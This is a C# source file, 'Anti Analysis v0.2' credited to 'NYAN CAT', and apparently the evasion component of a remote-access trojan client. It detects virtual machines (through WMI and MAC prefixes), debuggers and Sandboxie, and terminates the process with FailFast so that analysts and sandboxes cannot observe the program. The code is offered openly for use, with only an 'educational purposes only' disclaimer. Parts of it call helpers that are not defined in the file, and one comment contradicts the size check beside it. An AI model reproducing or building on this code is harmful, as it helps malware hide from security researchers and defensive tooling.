using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

//       │ Author     : NYAN CAT
//       │ Name       : Anti Analysis v0.2
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.




namespace Client.Helper
{

    class Anti_Analysis
    {
        private static long GB_50 = 50000000000;
        public static void RunAntiAnalysis()
        {
            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                Environment.FailFast(null);
        }

        internal static bool SmallHDD()
        {

            // Method One - main drive smaller than 50gb, likely a VM
            long driveSize = Methods.GetMainDriveSize();
            if (driveSize <= GB_50 * 2)
                return true;

            // Method Two - has common card of virtual machine
            if (HasVMCard())
                return true;

            // Method Three - checks for vm drivers
            if (HasVBOXDriver())
                return true;

            // Method Four - if machine has been on for less than 5 mins
            if (GetUptime() < TimeSpan.FromMinutes(5))
                return true;

            // Method Five - has VM mac address
            if (HasVMMac())
                return true;

            return false;
        }
        private static bool HasVMMac()
        {
            var macAddr =
            (
                from nic in NetworkInterface.GetAllNetworkInterfaces()
                where nic.OperationalStatus == OperationalStatus.Up
                select nic.GetPhysicalAddress().ToString()
            ).FirstOrDefault();

            var macs = new[]
            {
                "00-05-69",
                "00:05:69",
                "000569",
                "00-50-56",
                "00:50:56",
                "005056",
                "00-0C-29",
                "00:0C:29",
                "000C29",
                "00-1C-14",
                "00:1C:14",
                "001C14",
                "08-00-27",
                "08:00:27",
                "080027",
            };
            foreach (string mac in macs)
            {
                if (mac == macAddr)
                    return true;
            }
            return false;
        }




        private static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }

        private static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            else
                return false;
        }


        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    }
}
